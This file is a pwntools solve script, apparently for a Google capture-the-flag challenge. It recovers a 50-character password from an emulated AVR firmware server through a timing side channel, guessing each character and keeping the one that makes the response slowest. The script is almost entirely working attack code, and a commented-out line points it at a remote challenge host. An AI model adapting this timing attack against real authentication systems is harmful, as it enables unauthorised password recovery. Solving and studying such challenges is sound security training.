# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

from pwn import *
from collections import Counter
import string

context.log_level = "ERROR"

def timeit(password):
    #r = remote("34.76.144.115", 1337)
    r = process(["simavr/examples/board_simduino/obj-x86_64-linux-gnu/simduino.elf", "avr/code_server.hex"])

    r.send("\nagent\n"+password+"\n")
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    s = r.recvline()
    r.close()
    return int(s.split()[1][:-2])

password = ["~"] * 50
time0 = timeit("".join(password))
for i in range(50):
    longest = float("-inf")
    cc = None
    baseline = []
    for j in range(25):
        baseline.append(timeit("".join(password)))
    most = Counter(baseline).most_common(1)[0][0]
    print(most)

    for c in range(33, 127):
        password[i] = chr(c)
        times = []
        while len(times) < 3:
            t = timeit("".join(password))
            if abs(t - most) < 10:
                times.append(t)
        times.sort()
        time = times[len(times)//2]
        print(c, times, time)
        if time > longest:
            longest = time
            cc = c

    password[i] = chr(cc)
    print("".join(password))
